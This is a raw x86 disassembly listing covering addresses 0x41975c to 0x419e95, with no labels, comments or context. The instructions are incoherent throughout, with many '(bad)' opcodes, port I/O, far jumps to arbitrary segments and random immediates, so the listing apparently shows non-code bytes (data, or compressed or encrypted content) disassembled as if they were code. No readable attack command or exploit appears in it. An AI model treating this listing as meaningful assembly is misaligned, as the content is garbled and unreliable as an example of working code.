  41975c:	adc    eax,0x1751ba00
  419761:	jbe    0x41972f
  419763:	and    al,0xdb
  419765:	push   edx
  419766:	mov    edx,0x9a001751
  41976b:	adc    DWORD PTR [edi],edx
  41976d:	jbe    0x419733
  41976f:	cmp    al,0xdb
  419771:	dec    edi
  419772:	mov    BYTE PTR [edi+0x1a],al
  419775:	add    BYTE PTR [edx+0x76171100],bh
  41977b:	mov    WORD PTR [ebx+ebx*8],fs
  41977e:	dec    edi
  41977f:	jle    0x41979d
  419781:	adc    eax,0x15159900
  419786:	push   0x7227ffe9
  41978b:	jg     0x4197de
  41978d:	pop    ss
  41978e:	push   esp
  41978f:	jo     0x4197d3
  419791:	sub    BYTE PTR [eax],al
  419793:	xor    eax,0x9741a52
  419798:	pop    esp
  419799:	sub    BYTE PTR [edx+0x5f],dh
  41979c:	cs pop ss
  41979e:	and    BYTE PTR [ecx],ah
  4197a0:	pop    eax
  4197a1:	sbb    dh,BYTE PTR [eax+eax*1-0x78]
  4197a5:	inc    esp
  4197a6:	pop    ebp
  4197a7:	jae    0x4197e5
  4197a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197aa:	push   eax
  4197ab:	gs sub dh,bh
  4197ae:	pusha  
  4197af:	jb     0x4197e9
  4197b1:	fsubr  QWORD PTR [esi+0x65]
  4197b4:	cmp    al,BYTE PTR ds:0xf93b614c
  4197ba:	pop    ds
  4197bb:	push   ebx
  4197bc:	cmp    eax,0x2a6575f3
  4197c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197c2:	dec    ebp
  4197c3:	popa   
  4197c4:	cmp    esi,ebp
  4197c6:	dec    DWORD PTR [ebx+0x29]
  4197c9:	div    BYTE PTR [ebx+0x20]
  4197cc:	dec    ebx
  4197cd:	in     al,dx
  4197ce:	jno    0x419846
  4197d0:	sub    eax,0x7501ff3
  4197d5:	div    BYTE PTR [ebx+0x0]
  4197d8:	(bad)  
  4197d9:	out    0x6e,al
  4197db:	je     0x4197dd
  4197dd:	cmp    dh,dl
  4197df:	pusha  
  4197e0:	jb     0x4197c0
  4197e2:	jmp    0x6873:0xe6982071
  4197e9:	or     BYTE PTR [ebp+ebx*2+0x73],al
  4197ed:	lods   al,BYTE PTR ds:[esi]
  4197ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197ef:	push   eax
  4197f0:	gs stos BYTE PTR es:[edi],al
  4197f2:	stc    
  4197f3:	pusha  
  4197f4:	jb     0x4197de
  4197f6:	(bad)  [eax+esi*2-0x53]
  4197fa:	pop    es
  4197fb:	inc    esi
  4197fc:	push   esp
  4197fd:	mov    BYTE PTR [edi-0x21619eb5],ah
  419803:	bound  esp,QWORD PTR [ecx+0x3c]
  419806:	loope  0x419879
  419808:	add    BYTE PTR [esi-0x24dfb025],cl
  41980e:	loopne 0x419878
  419810:	ins    DWORD PTR es:[edi],dx
  419811:	mov    ecx,0xfa6563e1
  419816:	add    al,0x66
  419818:	je     0x419812
  41981a:	loopne 0x419880
  41981c:	jae    0x41984f
  41981e:	cs jmp 0xf35c:0x4360973
  419826:	int3   
  419827:	daa    
  419828:	ins    BYTE PTR es:[edi],dx
  419829:	or     al,0xd6
  41982b:	xor    esi,DWORD PTR [edx-0x22]
  41982e:	inc    edx
  41982f:	and    ah,BYTE PTR [eax]
  419831:	add    cl,bl
  419833:	and    DWORD PTR [esi+eiz*8+0x0],esi
  419837:	push   ss
  419838:	arpl   WORD PTR [ecx],si
  41983a:	mov    esp,0xa1c55f1d
  41983f:	out    0x61,eax
  419841:	add    cl,al
  419843:	out    dx,al
  419844:	add    edx,DWORD PTR [ecx-0x32]
  419847:	sti    
  419848:	pcmpeqw mm2,mm0
  41984b:	(bad)  
  41984c:	push   ds
  41984d:	pop    esp
  41984e:	jae    0x419840
  419850:	inc    ecx
  419851:	push   esp
  419852:	cmp    esp,0xb48d7345
  419858:	push   ds
  419859:	je     0x4198ac
  41985b:	push   eax
  41985c:	adc    ebp,DWORD PTR [ebp-0x62]
  41985f:	mov    edx,0x505d45e1
  419864:	xor    eax,0x27b9904b
  419869:	add    BYTE PTR [edx-0x45],ah
  41986c:	pop    ds
  41986d:	je     0x4198d5
  41986f:	rcl    DWORD PTR [ebx],0x63
  419872:	test   DWORD PTR [esi+0xe],ebx
  419875:	ins    BYTE PTR es:[edi],dx
  419876:	dec    ebp
  419877:	jge    0x419886
  419879:	push   eax
  41987a:	arpl   WORD PTR [ebx+0x28],di
  41987d:	adc    WORD PTR [edi+0x28],cx
  419881:	cmp    ax,0x2273
  419885:	jb     0x4198db
  419887:	fs inc ebx
  419889:	jae    0x4198d0
  41988b:	jl     0x4198ab
  41988d:	je     0x419890
  41988f:	push   cs
  419890:	sub    BYTE PTR [ebp+0xf],ch
  419893:	sar    BYTE PTR [edi],0x54
  419896:	add    DWORD PTR [ecx],ecx
  419898:	pop    es
  419899:	inc    ebx
  41989a:	add    eax,0x5264420
  41989f:	sub    eax,0x1b0e2524
  4198a4:	out    0x32,eax
  4198a6:	add    BYTE PTR [ebx+eiz*1],cl
  4198a9:	cmp    ecx,DWORD PTR [edi]
  4198ab:	(bad)  
  4198ac:	push   ss
  4198ad:	inc    esp
  4198ae:	cmp    bl,dh
  4198b0:	cmp    BYTE PTR ds:0x292d0130,ch
  4198b6:	adc    ebp,ecx
  4198b8:	sbb    al,0xc
  4198ba:	adc    BYTE PTR [ecx],dl
  4198bc:	cmp    DWORD PTR [ecx],ebx
  4198be:	daa    
  4198bf:	fsub   QWORD PTR [edx]
  4198c1:	(bad)  
  4198c2:	cmp    eax,0x472b38dd
  4198c7:	rcl    DWORD PTR [eax+edx*1],0x27
  4198cb:	(bad)  
  4198cc:	adc    eax,0x239c32e7
  4198d1:	sti    
  4198d2:	push   cs
  4198d3:	xchg   BYTE PTR [edi],dl
  4198d5:	add    al,0x38
  4198d7:	jae    0x4198ed
  4198d9:	shl    DWORD PTR [edi],cl
  4198db:	xchg   edx,eax
  4198dc:	adc    eax,0x1a9c11b7
  4198e1:	int    0xe3
  4198e3:	popa   
  4198e4:	sbb    al,ch
  4198e6:	je     0x55625214
  4198ec:	inc    edi
  4198ed:	mov    ah,0x27
  4198ef:	pop    ebp
  4198f0:	and    al,0xbb
  4198f2:	xor    esp,DWORD PTR [ebx+0x1a]
  4198f5:	mov    esi,0xbb43111d
  4198fa:	xor    edx,DWORD PTR [ecx]
  4198fc:	inc    esi
  4198fd:	mov    ebp,DWORD PTR [edx+edx*2]
  419900:	sbb    ebx,DWORD PTR [ebx-0x6ce68bc9]
  419906:	sub    al,0x4c
  419908:	sbb    edi,DWORD PTR [edx+0x3]
  41990b:	add    BYTE PTR [eax+0x1a],ah
  41990e:	test   DWORD PTR [edi],ecx
  419910:	and    al,0x28
  419912:	add    BYTE PTR [ebx+0x51],bh
  419915:	sub    eax,0x355c9942
  41991a:	push   eax
  41991b:	jmp    0x55b2c30e
  419920:	inc    edx
  419921:	es jno 0x41997e
  419924:	push   esp
  419925:	sbb    al,0x6e
  419927:	daa    
  419928:	dec    esp
  419929:	sbb    eax,0x2243e963
  41992e:	je     0x419974
  419930:	inc    edx
  419931:	inc    ebp
  419932:	cmp    ebp,DWORD PTR [di]
  419935:	inc    edx
  419936:	outs   dx,BYTE PTR ds:[esi]
  419937:	cmp    al,BYTE PTR [ecx+0x2a]
  41993a:	ins    BYTE PTR es:[edi],dx
  41993b:	adc    eax,0xd87221f1
  419940:	xor    bl,bl
  419942:	ja     0x419948
  419944:	sbb    DWORD PTR [ecx],ecx
  419946:	pop    esp
  419947:	cmp    cl,BYTE PTR [eax]
  419949:	sub    dh,BYTE PTR [edx-0x3]
  41994c:	hlt    
  41994d:	xor    al,0x50
  41994f:	jmp    0x6b781c0
  419954:	inc    ebx
  419955:	lock jae 0x41995c
  419958:	inc    edx
  419959:	aaa    
  41995a:	fs enter 0x926,0x48
  41995f:	shl    BYTE PTR [ebx],1
  419961:	std    
  419962:	ins    BYTE PTR es:[edi],dx
  419963:	(bad)  ds:0x2ec86437
  419969:	or     DWORD PTR [edi-0x33],ebx
  41996c:	push   ss
  41996d:	sti    
  41996e:	popa   
  41996f:	rol    BYTE PTR [eax],cl
  419971:	aam    0xec
  419973:	pop    esi
  419974:	mov    ebp,0xc072f832
  419979:	adc    esi,edx
  41997b:	sub    eax,0xfffd0d8d
  419980:	mov    esp,0x8b71fc1e
  419985:	bswap  edi
  419987:	push   ebx
  419988:	mov    ecx,0x6cda32
  41998d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41998e:	sbb    BYTE PTR [ebx+0x61],dh
  419991:	sub    ch,BYTE PTR [ecx]
  419993:	pop    esp
  419994:	push   esp
  419995:	and    eax,0xd66f621a
  41999a:	cmp    BYTE PTR [eax+0x0],dl
  41999d:	add    DWORD PTR [edi],ebp
  41999f:	outs   dx,DWORD PTR ds:[esi]
  4199a0:	je     0x41999b
  4199a2:	xor    BYTE PTR [eax+esi*2-0x7],ch
  4199a6:	sbb    BYTE PTR [eax+0x0],ch
  4199a9:	cmp    ebp,DWORD PTR [esi]
  4199ab:	data16 je 0x4199e5
  4199ae:	sub    al,0x72
  4199b0:	gs dec esp
  4199b2:	cmp    ch,BYTE PTR [ebx+0x74]
  4199b5:	stc    
  4199b6:	inc    eax
  4199b7:	inc    esi
  4199b8:	inc    esi
  4199b9:	push   ss
  4199ba:	cmp    DWORD PTR [eax+0x0],edx
  4199bd:	or     ebx,DWORD PTR [ebx]
  4199bf:	popa   
  4199c0:	fs xor eax,0x3969742f
  4199c6:	xor    DWORD PTR [edi+0x61],ecx
  4199c9:	cmp    al,0x18
  4199cb:	add    BYTE PTR [ebx+0x3a],al
  4199ce:	daa    
  4199cf:	fs gs sbb DWORD PTR ds:[ebp+0x61],esp
  4199d5:	add    BYTE PTR [edx+ecx*8],ch
  4199d8:	sub    esi,DWORD PTR gs:[bp+si]
  4199dc:	add    BYTE PTR [ebx-0x1],dl
  4199df:	and    eax,0x19f97774
  4199e4:	popa   
  4199e5:	pop    esp
  4199e6:	retf   
  4199e7:	sub    al,0x74
  4199e9:	popa   
  4199ea:	int3   
  4199eb:	inc    ebp
  4199ec:	inc    esi
  4199ed:	inc    esi
  4199ee:	xchg   esp,eax
  4199ef:	cmp    ebx,DWORD PTR [edi+ecx*2-0x58]
  4199f3:	pop    ss
  4199f4:	outs   dx,DWORD PTR gs:[esi]
  4199f6:	out    dx,al
  4199f7:	sbb    BYTE PTR [eax],al
  4199f9:	push   eax
  4199fa:	jmp    0xbfb90917
  4199ff:	sbb    DWORD PTR [eax+eax*1-0x7b],esp
  419a03:	sbb    BYTE PTR [ecx+0x72],ah
  419a06:	xor    DWORD PTR [eax+0x72546b22],esi
  419a0c:	dec    ecx
  419a0d:	ins    DWORD PTR es:[edi],dx
  419a0e:	inc    edx
  419a0f:	push   es
  419a10:	inc    edx
  419a11:	and    eax,DWORD PTR fs:[ebx]
  419a14:	add    DWORD PTR [edx+0xc],edx
  419a17:	lea    esp,[esp+esi*2]
  419a1a:	adc    al,0xae
  419a1c:	sub    dh,BYTE PTR [edx+0x31]
  419a1f:	inc    edx
  419a20:	and    esi,DWORD PTR [edx+0x5]
  419a23:	jb     0x419a6e
  419a25:	ins    DWORD PTR es:[edi],dx
  419a26:	add    ah,dh
  419a28:	inc    ebp
  419a29:	pop    edi
  419a2a:	or     al,0xcd
  419a2c:	add    edx,DWORD PTR [eax+0x6]
  419a2f:	inc    esp
  419a30:	adc    BYTE PTR [eax],al
  419a32:	add    al,0x43
  419a34:	sbb    eax,0x24d0d772
  419a39:	arpl   WORD PTR [eax],ax
  419a3b:	xor    DWORD PTR [edx],esp
  419a3d:	and    DWORD PTR [ecx-0x1e],esi
  419a40:	and    esi,DWORD PTR es:[edx-0x2b]
  419a44:	jno    0x419a8f
  419a46:	ins    DWORD PTR es:[edi],dx
  419a47:	ret    0x4025
  419a4a:	addr16 ret 
  419a4c:	daa    
  419a4d:	and    DWORD PTR [ebx-0x34],ebp
  419a50:	jno    0x419a82
  419a52:	ins    DWORD PTR es:[edi],dx
  419a53:	xchg   edi,eax
  419a54:	jl     0x419a62
  419a56:	pop    edi
  419a57:	mov    ds:0x8e413815,eax
  419a5c:	push   cs
  419a5d:	push   ds
  419a5e:	arpl   WORD PTR [ebx+esi*4-0x3cae8ff2],cx
  419a65:	and    al,0x66
  419a67:	jge    0x419ad0
  419a69:	and    dh,BYTE PTR [edx-0x6c]
  419a6c:	mov    ah,0x4a
  419a6e:	outs   dx,BYTE PTR ds:[esi]
  419a6f:	jge    0x419ac6
  419a71:	movd   mm2,DWORD PTR [esp+edi*4+0x35]
  419a76:	push   eax
  419a77:	arpl   WORD PTR [edi+0x1b],cx
  419a7a:	addr16 dec ebp
  419a7c:	dec    ebp
  419a7d:	adc    BYTE PTR [eax],al
  419a7f:	or     BYTE PTR [ecx],0x96
  419a82:	sbb    eax,0x1187fe45
  419a87:	push   edx
  419a88:	in     eax,0xac
  419a8a:	das    
  419a8b:	popa   
  419a8c:	fiadd  WORD PTR [edi-0x561aadef]
  419a92:	inc    esp
  419a93:	add    ecx,esp
  419a95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a96:	das    
  419a97:	add    ebp,esp
  419a99:	cdq    
  419a9a:	sub    ah,BYTE PTR ds:0x379ec
  419aa0:	jmp    0x3159f49a
  419aa5:	fcomp  QWORD PTR [ecx+0x29]
  419aa8:	add    ecx,DWORD PTR [ecx]
  419aaa:	aaa    
  419aab:	and    eax,DWORD PTR [ebx]
  419aad:	std    
  419aae:	out    0x33,al
  419ab0:	fmul   QWORD PTR [eax]
  419ab2:	pop    ss
  419ab3:	sbb    cl,bl
  419ab5:	(bad)  
  419ab7:	ss add cl,dl
  419aba:	out    0x13,al
  419abc:	jecxz  0x419ab3
  419abe:	inc    esp
  419abf:	sbb    eax,0xe219ebc5
  419ac4:	(bad)  
  419ac5:	repz or al,BYTE PTR [eiz*8+0x11343ace]
  419acd:	int3   
  419ace:	push   cs
  419acf:	adc    al,0xc5
  419ad1:	cmc    
  419ad2:	clc    
  419ad3:	sub    BYTE PTR [ebx-0x70dce5f7],ah
  419ad9:	std    
  419ada:	std    
  419adb:	and    al,0xa3
  419add:	in     al,dx
  419ade:	or     cl,BYTE PTR [edx+0x7d]
  419ae1:	fld    DWORD PTR [esi]
  419ae3:	dec    ecx
  419ae4:	mov    ecx,edi
  419ae6:	retf   0x8322
  419ae9:	in     al,dx
  419aea:	fsubr  DWORD PTR [edi]
  419aec:	ja     0x419acb
  419aee:	mov    dh,0xe3
  419af0:	jae    0x419af3
  419af2:	mov    bh,0x1f
  419af4:	pop    esp
  419af5:	sti    
  419af6:	ret    
  419af7:	adc    eax,0xc5ffde85
  419afc:	inc    esp
  419afd:	lock jo 0x419ab9
  419b00:	or     eax,0xc562e8
  419b05:	jno    0x419ad6
  419b07:	inc    eax
  419b08:	mov    ch,0x13
  419b0a:	hlt    
  419b0b:	imul   ebp,DWORD PTR [ebx-0x24d504eb],0xffffffdc
  419b12:	cmp    DWORD PTR [eax],eax
  419b14:	stos   DWORD PTR es:[edi],eax
  419b15:	dec    ecx
  419b16:	std    
  419b17:	jae    0x419aa7
  419b19:	push   eax
  419b1a:	clc    
  419b1b:	call   FWORD PTR [ecx+0x7673ef53]
  419b21:	dec    ebp
  419b22:	sti    
  419b23:	bound  eax,QWORD PTR [ebp-0x5]
  419b26:	fmul   QWORD PTR [edi+0x9]
  419b29:	clc    
  419b2a:	add    BYTE PTR [eax+0x45],dh
  419b2d:	push   edx
  419b2e:	sti    
  419b2f:	bound  ebx,QWORD PTR [ebx+0x41]
  419b32:	fnstenv [ecx+0x56]
  419b35:	sbb    ebp,esi
  419b37:	imul   eax,DWORD PTR [esi+edi*1+0x9],0x50
  419b3c:	dec    eax
  419b3d:	inc    esi
  419b3e:	clc    
  419b3f:	je     0x419b7f
  419b41:	aas    
  419b42:	in     eax,dx
  419b43:	(bad)  
  419b44:	cmp    BYTE PTR [eax+edi*8],dl
  419b47:	jo     0x419b5f
  419b49:	adc    bh,bl
  419b4b:	arpl   WORD PTR ds:0xe962f92c,di
  419b51:	cli    
  419b52:	repz jo 0x419b52
  419b55:	xor    dl,ch
  419b57:	ins    BYTE PTR es:[edi],dx
  419b58:	push   es
  419b59:	inc    esp
  419b5a:	repz call FWORD PTR [eax]
  419b5d:	push   edx
  419b5e:	div    DWORD PTR [ebx-0x17]
  419b61:	push   ebp
  419b62:	repz data16 (bad) ds:0xb96be4
  419b6a:	dec    ebp
  419b6b:	std    
  419b6c:	addr16 jmp 0xbab198da
  419b72:	adc    eax,0x460062fd
  419b77:	adc    eax,0x34d86c69
  419b7c:	inc    esi
  419b7d:	jb     0x419b70
  419b7f:	das    
  419b80:	pop    ebp
  419b81:	je     0x419b70
  419b83:	pop    ebx
  419b84:	std    
  419b85:	sub    eax,0x652aa1
  419b8a:	test   BYTE PTR [edx+0x5d],al
  419b8d:	outs   dx,BYTE PTR ds:[esi]
  419b8e:	mov    WORD PTR ds:0xcb846567,ss
  419b94:	push   0x6e
  419b96:	mov    esi,0xcb5c6325
  419b9b:	xor    DWORD PTR [edi+0x73],ebp
  419b9e:	mov    cl,0x27
  419ba0:	outs   dx,BYTE PTR ds:[esi]
  419ba1:	jae    0x419b2b
  419ba3:	xor    al,0x4f
  419ba5:	gs jmp 0x419bc5
  419ba8:	outs   dx,DWORD PTR gs:[esi]
  419baa:	neg    BYTE PTR ds:0x2ef75300
  419bb0:	je     0x419c29
  419bb2:	jmp    0x4e9dfcd1
  419bb7:	sub    BYTE PTR [esi+0x44],ch
  419bba:	icebp  
  419bbb:	and    eax,0x2c3b5c61
  419bc0:	pop    edi
  419bc1:	jne    0x419bdd
  419bc3:	sub    al,0x46
  419bc5:	pop    eax
  419bc6:	pop    eax
  419bc7:	int    0x6a
  419bc9:	outs   dx,BYTE PTR ds:[esi]
  419bca:	and    BYTE PTR cs:[ebx+0x20],ah
  419bce:	add    al,bh
  419bd0:	daa    
  419bd1:	je     0x419c3b
  419bd3:	dec    eax
  419bd4:	cmp    ebp,DWORD PTR [esp+esi*2+0x2a]
  419bd8:	daa    
  419bd9:	inc    esi
  419bda:	pop    eax
  419bdb:	dec    eax
  419bdc:	or     eax,0x2131735c
  419be1:	popa   
  419be2:	jae    0x419bba
  419be4:	punpckhwd mm5,QWORD PTR [eax+ebx*1+0x34]
  419be9:	inc    esi
  419bea:	push   esp
  419beb:	enter  0x713d,0x73
  419bef:	xor    DWORD PTR [edx+0x1],ecx
  419bf2:	push   edx
  419bf3:	jl     0x419c54
  419bf5:	sbb    DWORD PTR [ecx+0x58],edx
  419bf8:	(bad)  
  419bf9:	es imul edx,DWORD PTR cs:[ebp+0x1d],0x13558200
  419c02:	jbe    0x419c50
  419c04:	rol    BYTE PTR [ecx],0x53
  419c07:	inc    edx
  419c08:	xchg   ebp,eax
  419c09:	adc    ebp,DWORD PTR [esi+0x50]
  419c0c:	xchg   ebp,eax
  419c0d:	add    BYTE PTR es:[ecx-0x6f],ah
  419c11:	adc    al,0x71
  419c13:	add    edx,DWORD PTR ds:[ebx]
  419c16:	xor    DWORD PTR fs:[ebp+edx*1+0x13930170],esi
  419c1e:	je     0x419c51
  419c20:	lahf   
  419c21:	and    BYTE PTR [esi+0x1d],ah
  419c24:	sti    
  419c25:	and    DWORD PTR [edx+0x14],esi
  419c28:	into   
  419c29:	inc    edx
  419c2a:	jb     0x419c34
  419c2c:	int    0x15
  419c2e:	pop    esp
  419c2f:	out    0xd4,al
  419c31:	and    eax,0xde080051
  419c36:	and    al,0x50
  419c38:	in     al,0xcf
  419c3a:	pop    ds
  419c3b:	addr16 loop 0x419c17
  419c3e:	and    al,0x72
  419c40:	xor    DWORD PTR [esi],ebx
  419c42:	inc    esi
  419c43:	frstor ds:0x6e19
  419c48:	aam    0x29
  419c4a:	add    al,0x62
  419c4c:	fcomp  DWORD PTR ds:0x14cf671b
  419c52:	or     al,0x2e
  419c54:	int    0x1e
  419c56:	add    al,0x48
  419c58:	sahf   
  419c59:	jg     0x419c70
  419c5b:	outs   dx,BYTE PTR ds:[esi]
  419c5c:	nop
  419c5d:	adc    eax,0x7f840025
  419c62:	es jb  0x419bec
  419c65:	adc    DWORD PTR ds:0xb7093163,ebx
  419c6b:	and    al,BYTE PTR [eax-0x7cdf2a0a]
  419c71:	in     eax,dx
  419c72:	out    0x33,al
  419c74:	test   bh,dh
  419c76:	rol    BYTE PTR [ebx],cl
  419c78:	xor    dl,0xcc
  419c7b:	pop    ss
  419c7c:	pop    esp
  419c7d:	call   0xccbec33a
  419c82:	scas   al,BYTE PTR es:[edi]
  419c83:	adc    esi,DWORD PTR [esi-0xd]
  419c86:	mov    ds:0x8bfb5615,al
  419c8b:	das    
  419c8c:	pusha  
  419c8d:	in     al,dx
  419c8e:	cdq    
  419c8f:	adc    al,0x56
  419c91:	repnz test BYTE PTR [ecx+esi*1],dl
  419c95:	in     eax,0xa3
  419c97:	or     eax,DWORD PTR [eax]
  419c99:	and    eax,ebp
  419c9b:	xchg   esp,eax
  419c9c:	inc    edi
  419c9d:	and    esi,eax
  419c9f:	je     0x419cc7
  419ca1:	xor    ebp,esp
  419ca3:	mov    dl,BYTE PTR ds:0x1483fb0e
  419ca9:	pop    edi
  419caa:	out    dx,eax
  419cab:	pop    ecx
  419cac:	add    al,0x53
  419cae:	stc    
  419caf:	inc    edi
  419cb0:	adc    eax,DWORD PTR [eax]
  419cb2:	cli    
  419cb3:	inc    ebp
  419cb4:	adc    cl,BYTE PTR ds:0x4eca0727
  419cba:	daa    
  419cbb:	out    0xe1,eax
  419cbd:	sbb    cl,BYTE PTR [ecx]
  419cbf:	sbb    bl,BYTE PTR [edi]
  419cc1:	xlat   BYTE PTR ds:[ebx]
  419cc2:	cld    
  419cc3:	cmp    eax,0xaebe325
  419cc8:	dec    ecx
  419cc9:	leave  
  419cca:	clc    
  419ccb:	pop    es
  419ccc:	push   ds
  419ccd:	in     eax,dx
  419cce:	test   BYTE PTR [edi],0x16
  419cd1:	ror    BYTE PTR [eax],cl
  419cd3:	sub    al,0xc
  419cd5:	shl    edi,0xfc
  419cd8:	inc    edi
  419cd9:	mov    ds:0x8428fcf0,eax
  419cde:	ror    DWORD PTR ds:0x99221,1
  419ce4:	sbb    cl,BYTE PTR [eax-0x9]
  419ce7:	jne    0x419ced
  419ce9:	and    ecx,DWORD PTR [ecx]
  419ceb:	push   ebx
  419cec:	ficomp DWORD PTR [ecx-0x9]
  419cef:	dec    ebp
  419cf0:	enter  0xe651,0xff
  419cf4:	mov    eax,0xd670f84d
  419cf9:	dec    edi
  419cfa:	mul    DWORD PTR [ebx-0x17]
  419cfd:	add    BYTE PTR [edi],dl
  419cff:	fstp   DWORD PTR [esi-0x46]
  419d02:	inc    ebx
  419d03:	cld    
  419d04:	ins    BYTE PTR es:[edi],dx
  419d05:	mov    ebx,0xc044090e
  419d0a:	and    dh,ah
  419d0c:	pusha  
  419d0d:	popf   
  419d0e:	daa    
  419d0f:	div    DWORD PTR [esi-0x17]
  419d12:	add    esi,esp
  419d14:	gs popf 
  419d16:	pop    ds
  419d17:	loop   0x419d8a
  419d19:	test   BYTE PTR [esi-0x2d],bl
  419d1c:	inc    eax
  419d1d:	mov    cl,0x92
  419d1f:	fsubr  DWORD PTR [edi+eax*4+0x46]
  419d23:	cld    
  419d24:	pop    esi
  419d25:	jnp    0x419d70
  419d27:	in     eax,0x40
  419d29:	jge    0x419d80
  419d2b:	clc    
  419d2c:	jo     0x419d7e
  419d2e:	push   edx
  419d2f:	retf   
  419d30:	push   ebx
  419d31:	cmp    DWORD PTR [ecx-0x35],eax
  419d34:	push   ebx
  419d35:	cmp    esp,ebp
  419d37:	out    0x60,eax
  419d39:	ds dec eax
  419d3b:	repz jae 0x419d78
  419d3e:	sub    eax,0x223973cb
  419d43:	out    0x71,al
  419d45:	aas    
  419d46:	or     bh,dh
  419d48:	jmp    DWORD PTR [esi]
  419d4a:	sub    ecx,edi
  419d4c:	push   edx
  419d4d:	sbb    bl,BYTE PTR [eax]
  419d4f:	test   DWORD PTR [ebp+0x8],0x2effe610
  419d56:	sbb    ecx,edi
  419d58:	dec    edi
  419d59:	or     BYTE PTR [edx-0x6],al
  419d5c:	je     0x419d5e
  419d5e:	aas    
  419d5f:	sbb    esp,DWORD PTR [eax+eax*1+0x0]
  419d63:	aas    
  419d64:	(bad)  
  419d65:	jae    0x419dd7
  419d67:	cmp    BYTE PTR [esi],ah
  419d69:	outs   dx,DWORD PTR ds:[esi]
  419d6a:	jae    0x419d73
  419d6c:	and    BYTE PTR [edx+0x64],dh
  419d6f:	sbb    bh,al
  419d71:	jae    0x419de3
  419d73:	aam    0x1d
  419d75:	jb     0x419ddc
  419d77:	jmp    0x419d91
  419d79:	imul   esi,DWORD PTR [edx+0x1],0xd
  419d7d:	dec    edi
  419d7e:	dec    edi
  419d7f:	xchg   esi,eax
  419d80:	cmp    BYTE PTR [ebx+0x41],dl
  419d83:	mov    edx,0x8b4e5bd1
  419d88:	inc    esp
  419d89:	and    BYTE PTR [ebx-0x71],dl
  419d8c:	es je  0x419e06
  419d8f:	mov    ecx,0x965c611a
  419d94:	and    BYTE PTR [ebp+0x6e],ah
  419d97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d98:	xor    BYTE PTR ds:0x711fbb63,bh
  419d9e:	outs   dx,BYTE PTR ds:[esi]
  419d9f:	and    al,0x1b
  419da1:	add    BYTE PTR [ebx-0x51],dl
  419da4:	es je  0x419e1e
  419da7:	test   eax,0xd65c611a
  419dac:	cmp    BYTE PTR [eax+0x43],dl
  419daf:	fsub   QWORD PTR [ebx]
  419db1:	popa   
  419db2:	outs   dx,BYTE PTR ds:[esi]
  419db3:	in     al,0x38
  419db5:	dec    edi
  419db6:	imul   edx,esp,0x2b006f27
  419dbc:	push   ds
  419dbd:	data16 je 0x419de7
  419dc0:	sub    al,0x72
  419dc2:	gs cmp al,0x3a
  419dc5:	imul   esp,DWORD PTR [esi+0x0],0x14
  419dc9:	sub    eax,0x260a6f2e
  419dce:	pop    esp
  419dcf:	inc    esi
  419dd0:	add    al,0x35
  419dd2:	aas    
  419dd3:	ins    BYTE PTR es:[edi],dx
  419dd4:	and    DWORD PTR [eax],ebp
  419dd6:	outs   dx,BYTE PTR ds:[esi]
  419dd7:	je     0x419e0a
  419dd9:	ss das 
  419ddb:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  419ddd:	add    eax,0x1757000f
  419de2:	or     al,0x61
  419de4:	xor    DWORD PTR [eax+0x1c],edx
  419de7:	ins    BYTE PTR es:[edi],dx
  419de8:	test   DWORD PTR [edx+0x23],esi
  419deb:	je     0x419d6e
  419ded:	jle    0x419e11
  419def:	jno    0x419e6e
  419df1:	sbb    BYTE PTR [ebx],bl
  419df3:	jno    0x419d8a
  419df5:	jb     0x419e24
  419df7:	inc    ebp
  419df8:	popa   
  419df9:	ret    
  419dfa:	sbb    al,0x66
  419dfc:	gs push edi
  419dfe:	and    dh,BYTE PTR [edx+0x4c]
  419e01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e02:	inc    ebp
  419e03:	arpl   WORD PTR [di+0x20],ax
  419e07:	je     0x419e4f
  419e09:	les    ecx,FWORD PTR [edx]
  419e0b:	and    BYTE PTR [esi-0x3e],bh
  419e0e:	push   ss
  419e0f:	jno    0x419e42
  419e11:	inc    esi
  419e12:	xor    BYTE PTR [eax+0x50],ch
  419e15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e16:	es bound ecx,QWORD PTR fs:[ebp+0x187415]
  419e1e:	and    al,0x71
  419e20:	push   edi
  419e21:	xchg   ebx,eax
  419e22:	and    BYTE PTR [ecx+0x31],dh
  419e25:	sahf   
  419e26:	xor    BYTE PTR [eax+0x10],ch
  419e29:	add    al,0x26
  419e2b:	fs add dl,ah
  419e2e:	test   BYTE PTR ds:0x22d81874,dl
  419e34:	jno    0x419e14
  419e36:	and    BYTE PTR [ebx],ch
  419e38:	xor    dh,dl
  419e3a:	sbb    al,0xde
  419e3c:	pusha  
  419e3d:	shl    dl,cl
  419e3f:	add    ebx,DWORD PTR [edx+eax*1-0x26]
  419e43:	and    BYTE PTR [edx-0x2c],dh
  419e46:	lds    ebp,FWORD PTR [esi]
  419e48:	arpl   bp,bx
  419e4a:	cmp    eax,0x42d66e19
  419e4f:	fidiv  WORD PTR [eax-0x40]
  419e52:	or     BYTE PTR [ebx],dl
  419e54:	sbb    eax,ebp
  419e56:	in     eax,0xe6
  419e58:	das    
  419e59:	loopne 0x419e4b
  419e5b:	pop    es
  419e5c:	adc    dl,BYTE PTR [edx-0x62d8c61b]
  419e62:	cmc    
  419e63:	nop    DWORD PTR [edx+edi*8+0x3975d31d]
  419e6b:	push   ss
  419e6c:	xlat   BYTE PTR ds:[ebx]
  419e6d:	pop    esp
  419e6e:	cli    
  419e6f:	neg    DWORD PTR [edi]
  419e71:	mov    ?,ebp
  419e73:	retf   
  419e74:	add    ebx,DWORD PTR [ebp-0x36]
  419e77:	int    0x25
  419e79:	(bad)  
  419e7a:	in     al,0xcb
  419e7c:	inc    eax
  419e7d:	(bad)  
  419e7e:	stc    
  419e7f:	push   es
  419e80:	xor    DWORD PTR [edi+eiz*8-0x46],edx
  419e84:	adc    al,0x7e
  419e86:	sti    
  419e87:	ret    
  419e88:	add    eax,DWORD PTR [ebp-0x1c]
  419e8b:	(bad)  
  419e8c:	adc    edx,DWORD PTR [edi-0xb]
  419e8f:	mov    dh,0x3
  419e91:	add    BYTE PTR [edx-0x11],al
  419e94:	xchg   edx,eax
  419e95:	es pop esi
